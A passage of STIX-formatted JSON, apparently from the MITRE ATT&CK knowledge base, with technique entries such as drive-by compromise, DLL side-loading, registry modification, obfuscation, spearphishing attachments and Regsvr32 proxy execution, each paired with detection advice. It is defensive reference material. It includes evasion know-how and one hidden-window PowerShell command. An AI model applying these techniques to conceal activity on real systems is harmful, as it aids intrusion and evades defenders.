            "description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)",
                "Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)"
            ],
            "x_mitre_detection": "Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.\n\nNetwork intrusion detection systems, sometimes with SSL/TLS inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\n\nDetecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1189",
                    "external_id": "T1189",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Shadowserver Strategic Web Compromise",
                    "description": "Adair, S., Moran, N. (2012, May 15). Cyber Espionage & Strategic Web Compromises \u2013 Trusted Websites Serving Dangerous Results. Retrieved March 13, 2018.",
                    "url": "http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/"
                },
                {
                    "url": "https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/",
                    "description": "Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017.",
                    "source_name": "Volexity OceanLotus Nov 2017"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Hidden Window",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Command: Command Execution",
                "Script: Script Execution",
                "File: File Modification"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-03-29T22:49:43.557Z",
            "created": "2020-03-13T20:26:49.433Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
            "x_mitre_platforms": [
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)",
            "x_mitre_contributors": [
                "Travis Smith, Tripwire"
            ],
            "x_mitre_detection": "Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1564/003",
                    "external_id": "T1564.003",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1",
                    "description": "Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019.",
                    "source_name": "PowerShell About 2019"
                },
                {
                    "source_name": "Antiquated Mac Malware",
                    "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
                    "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-04-26T18:31:34.954Z",
            "name": "DLL Side-Loading",
            "x_mitre_data_sources": [
                "File: File Creation",
                "File: File Modification",
                "Module: Module Load",
                "Process: Process Creation"
            ],
            "x_mitre_version": "2.0",
            "created": "2020-03-13T19:41:37.908Z",
            "x_mitre_defense_bypassed": [
                "Anti-virus",
                "Application control"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
            "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_detection": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1574/002",
                    "external_id": "T1574.002",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/641.html",
                    "external_id": "CAPEC-641",
                    "source_name": "capec"
                },
                {
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
                    "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
                    "source_name": "FireEye DLL Side-Loading"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Modify Registry",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Process: OS API Execution",
                "Command: Command Execution",
                "Windows Registry: Windows Registry Key Creation",
                "Windows Registry: Windows Registry Key Modification",
                "Windows Registry: Windows Registry Key Deletion"
            ],
            "x_mitre_version": "1.2",
            "modified": "2020-08-13T20:02:49.641Z",
            "created": "2017-05-31T21:31:23.587Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
            "x_mitre_defense_bypassed": [
                "Host forensic analysis"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User",
                "Administrator",
                "SYSTEM"
            ],
            "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",
            "x_mitre_contributors": [
                "Bartosz Jerzman",
                "Travis Smith, Tripwire",
                "David Lu, Tripwire"
            ],
            "x_mitre_detection": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1112",
                    "external_id": "T1112",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/203.html",
                    "external_id": "CAPEC-203",
                    "source_name": "capec"
                },
                {
                    "source_name": "Microsoft Reg",
                    "description": "Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.",
                    "url": "https://technet.microsoft.com/en-us/library/cc732643.aspx"
                },
                {
                    "source_name": "Microsoft Reghide NOV 2006",
                    "description": "Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018.",
                    "url": "https://docs.microsoft.com/sysinternals/downloads/reghide"
                },
                {
                    "source_name": "TrendMicro POWELIKS AUG 2014",
                    "description": "Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018.",
                    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/"
                },
                {
                    "source_name": "SpectorOps Hiding Reg Jul 2017",
                    "description": "Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018.",
                    "url": "https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353"
                },
                {
                    "source_name": "Microsoft Remote",
                    "description": "Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.",
                    "url": "https://technet.microsoft.com/en-us/library/cc754820.aspx"
                },
                {
                    "source_name": "Microsoft 4657 APR 2017",
                    "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018.",
                    "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657"
                },
                {
                    "source_name": "Microsoft RegDelNull July 2016",
                    "description": "Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018.",
                    "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Obfuscated Files or Information",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "File: File Metadata",
                "File: File Creation",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-10-20T16:33:13.472Z",
            "created": "2017-05-31T21:30:32.662Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_defense_bypassed": [
                "Host forensic analysis",
                "Signature-based detection",
                "Host intrusion prevention systems",
                "Application control",
                "Log analysis",
                "Application control by file name or path"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
            "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
            "x_mitre_contributors": [
                "Red Canary",
                "Christiaan Beek, @ChristiaanBeek"
            ],
            "x_mitre_detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1027",
                    "external_id": "T1027",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/267.html",
                    "external_id": "CAPEC-267",
                    "source_name": "capec"
                },
                {
                    "source_name": "Volexity PowerDuke November 2016",
                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
                },
                {
                    "source_name": "Linux/Cdorked.A We Live Security Analysis",
                    "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",
                    "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/"
                },
                {
                    "source_name": "Carbon Black Obfuscation Sept 2016",
                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
                },
                {
                    "source_name": "FireEye Obfuscation June 2017",
                    "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html"
                },
                {
                    "source_name": "FireEye Revoke-Obfuscation July 2017",
                    "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf"
                },
                {
                    "source_name": "PaloAlto EncodedCommand March 2017",
                    "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
                },
                {
                    "source_name": "GitHub Revoke-Obfuscation",
                    "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",
                    "url": "https://github.com/danielbohannon/Revoke-Obfuscation"
                },
                {
                    "source_name": "GitHub Office-Crackros Aug 2016",
                    "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",
                    "url": "https://github.com/itsreallynick/office-crackros"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Tool",
            "x_mitre_data_sources": [
                "Malware Repository: Malware Metadata"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-10-17T16:17:55.499Z",
            "created": "2020-10-01T02:08:33.977Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "resource-development"
                }
            ],
            "x_mitre_platforms": [
                "PRE"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
            "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
            "x_mitre_contributors": [
                "SOCCRATES",
                "Mnemonic AS"
            ],
            "x_mitre_detection": "In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1588/002",
                    "external_id": "T1588.002",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://www.recordedfuture.com/identifying-cobalt-strike-servers/",
                    "description": "Recorded Future. (2019, June 20). Out of the Blue: How Recorded Future Identified Rogue Cobalt Strike Servers. Retrieved October 16, 2020.",
                    "source_name": "Recorded Future Beacon 2019"
                },
                {
                    "url": "https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/",
                    "description": "Maynier, E. (2020, December 20). Analyzing Cobalt Strike for Fun and Profit. Retrieved October 12, 2021.",
                    "source_name": "Analyzing CS Dec 2020"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-10-18T17:39:12.452Z",
            "name": "Spearphishing Attachment",
            "x_mitre_data_sources": [
                "File: File Creation",
                "Application Log: Application Log Content",
                "Network Traffic: Network Traffic Content",
                "Network Traffic: Network Traffic Flow"
            ],
            "x_mitre_version": "2.2",
            "created": "2020-03-02T19:05:18.137Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "initial-access"
                }
            ],
            "x_mitre_platforms": [
                "macOS",
                "Windows",
                "Linux"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
            "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Philip Winther"
            ],
            "x_mitre_detection": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1566/001",
                    "external_id": "T1566.001",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/163.html",
                    "external_id": "CAPEC-163",
                    "source_name": "capec"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
                    "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
                    "source_name": "Microsoft Anti Spoofing"
                },
                {
                    "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
                    "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
                    "source_name": "ACSC Email Spoofing"
                },
                {
                    "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql",
                    "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
                    "source_name": "Elastic - Koadiac Detection with EQL"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Regsvr32",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Module: Module Load",
                "Command: Command Execution",
                "Network Traffic: Network Connection Creation"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-06-20T22:37:32.931Z",
            "created": "2020-01-23T19:52:17.414Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
            "x_mitre_defense_bypassed": [
                "Digital Certificate Validation",
                "Anti-virus",
                "Application control"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "Administrator",
                "User"
            ],
            "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
            "x_mitre_contributors": [
                "Casey Smith"
            ],
            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1218/010",
                    "external_id": "T1218.010",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://support.microsoft.com/en-us/kb/249873",
                    "description": "Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",
                    "source_name": "Microsoft Regsvr32"
                },
                {
